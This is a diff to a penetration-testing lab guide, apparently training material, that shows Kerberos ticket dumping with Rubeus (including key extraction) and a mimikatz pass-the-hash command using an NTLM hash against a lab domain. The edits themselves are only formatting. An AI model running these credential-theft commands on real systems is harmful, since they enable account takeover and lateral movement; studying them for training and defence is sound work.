@@ -37,13 +37,13 @@ dir *.kirbi
 If running as Local admin it will dump all the tickets. `Rubeus dump`, instead of giving us a file, will print the ticket encoded in base64 format.
 
 ```cmd-session
-Rubeus.exe dump /nowrap
+.\Rubeus.exe dump /nowrap
 ```
 
 Another interesting command:
 
 ```powershell
-Rubeus.exe dump /extractkeys /nowrap
+.\Rubeus.exe dump /extractkeys /nowrap
 ```
 
 
@@ -74,7 +74,7 @@ Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can per
 ```cmd-session
 mimikatz.exe
 privilege::debug
-sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f 
 ```
 
 This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
